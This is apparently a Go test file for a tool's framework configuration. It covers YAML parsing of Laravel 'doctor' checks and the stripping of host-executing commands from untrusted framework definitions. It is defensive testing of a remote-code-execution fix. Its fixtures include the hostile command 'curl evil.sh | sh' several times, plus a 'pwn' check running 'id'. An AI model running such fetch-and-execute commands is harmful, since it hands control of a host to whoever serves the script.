package config

import (
	"testing"

	"gopkg.in/yaml.v3"
)

// TestFrameworkDoctorYAML verifies the store schema for the doctor section maps
// onto the DoctorCheck struct tags, so a framework's declarative checks load.
func TestFrameworkDoctorYAML(t *testing.T) {
	src := `
name: laravel
doctor:
  checks:
    - name: app_debug
      type: env_combo
      when:
        APP_ENV: production
      warn_if:
        APP_DEBUG: "true"
    - name: storage_link
      type: symlink
      link: public/storage
      target: storage/app/public
      requires_dir: public
      fix: storage:link
    - name: migrations
      type: command
      command: php artisan migrate:status
      fail_if_output_contains: Pending
      unknown_on_error: true
      timeout: 25
      fix: migrate
`
	var fw Framework
	if err := yaml.Unmarshal([]byte(src), &fw); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if fw.Doctor == nil || len(fw.Doctor.Checks) != 3 {
		t.Fatalf("expected 3 doctor checks, got %+v", fw.Doctor)
	}

	combo := fw.Doctor.Checks[0]
	if combo.Type != "env_combo" || combo.When["APP_ENV"] != "production" || combo.WarnIf["APP_DEBUG"] != "true" {
		t.Errorf("env_combo not parsed: %+v", combo)
	}
	link := fw.Doctor.Checks[1]
	if link.Link != "public/storage" || link.Target != "storage/app/public" || link.RequiresDir != "public" || link.Fix != "storage:link" {
		t.Errorf("symlink not parsed: %+v", link)
	}
	cmd := fw.Doctor.Checks[2]
	if cmd.Command != "php artisan migrate:status" || cmd.FailIfOutputContains != "Pending" || !cmd.UnknownOnError || cmd.TimeoutSeconds != 25 {
		t.Errorf("command not parsed: %+v", cmd)
	}
}

// TestMergeBuiltinDoctor pins finding #1: a Laravel/Symfony definition whose store
// yaml predates the doctor block (or whose on-disk cache does) must inherit the
// builtin checks, so the prod-debug, storage-symlink, and pending-migration checks
// aren't silently dropped, while an existing doctor section is left untouched and a
// framework with no builtin stays doctor-less.
func TestMergeBuiltinDoctor(t *testing.T) {
	missing := mergeBuiltinDoctor(&Framework{Name: "laravel"})
	if missing.Doctor == nil || len(missing.Doctor.Checks) == 0 {
		t.Fatal("a Laravel definition with no doctor section must inherit the builtin checks")
	}

	own := &FrameworkDoctor{Checks: []DoctorCheck{{Name: "only_mine"}}}
	kept := mergeBuiltinDoctor(&Framework{Name: "laravel", Doctor: own})
	if kept.Doctor != own {
		t.Error("an existing doctor section must be left untouched")
	}

	if got := mergeBuiltinDoctor(&Framework{Name: "cakephp"}); got.Doctor != nil {
		t.Error("a framework with no builtin must stay doctor-less, not gain checks")
	}
}

// TestStripUntrustedDoctorChecks_NilsEmptyDoctor verifies a framework_def whose
// only checks were command-type ends up doctor-less rather than carrying an empty
// section.
func TestStripUntrustedDoctorChecks_NilsEmptyDoctor(t *testing.T) {
	fw := &Framework{Name: "acme", Doctor: &FrameworkDoctor{Checks: []DoctorCheck{
		{Name: "pwn", Type: "command", Command: "id"},
	}}}
	stripUntrustedDoctorChecks(fw)
	if fw.Doctor != nil {
		t.Errorf("doctor should be nil after stripping the only (command) check, got %+v", fw.Doctor)
	}
}

// TestSanitizeProjectFrameworkDef_DropsCommandChecksKeepsRest pins the framework_def
// RCE fix: the copy installed into the store has command-type doctor checks (which
// run on the host) stripped while inert checks survive, and the original is left
// untouched so config diffs still see the real file.
func TestSanitizeProjectFrameworkDef_DropsCommandChecksKeepsRest(t *testing.T) {
	orig := &Framework{Name: "acme", Doctor: &FrameworkDoctor{Checks: []DoctorCheck{
		{Name: "pwn", Type: "command", Command: "curl evil.sh | sh"},
		{Name: "app_debug", Type: "env_combo", When: map[string]string{"APP_ENV": "production"}},
	}}}
	safe := SanitizeProjectFrameworkDef(orig)
	if safe.Doctor == nil || len(safe.Doctor.Checks) != 1 || safe.Doctor.Checks[0].Type != "env_combo" {
		t.Fatalf("sanitized def should keep only the env_combo check, got %+v", safe.Doctor)
	}
	if len(orig.Doctor.Checks) != 2 {
		t.Errorf("original def must be left untouched, got %d checks", len(orig.Doctor.Checks))
	}
}

// TestSanitizeProjectFrameworkDef_DropsHostExecution pins the #692 store-import
// strip: an untrusted framework_def cannot seed host workers or commands, while
// in-container workers survive and the original is left untouched.
func TestSanitizeProjectFrameworkDef_DropsHostExecution(t *testing.T) {
	orig := &Framework{
		Name: "acme",
		Workers: map[string]FrameworkWorker{
			"evil":  {Command: "curl evil.sh | sh", Host: true},
			"queue": {Command: "php artisan queue:work"},
		},
		Commands: []FrameworkCommand{{Name: "pwn", Command: "curl evil.sh | sh"}},
	}
	safe := SanitizeProjectFrameworkDef(orig)
	if _, ok := safe.Workers["evil"]; ok {
		t.Error("host worker must be stripped from an untrusted framework_def")
	}
	if _, ok := safe.Workers["queue"]; !ok {
		t.Error("in-container worker must be preserved")
	}
	if len(safe.Commands) != 0 {
		t.Errorf("all commands must be stripped from an untrusted framework_def, got %d", len(safe.Commands))
	}
	if len(orig.Workers) != 2 || len(orig.Commands) != 1 {
		t.Error("original def must be left untouched")
	}
}
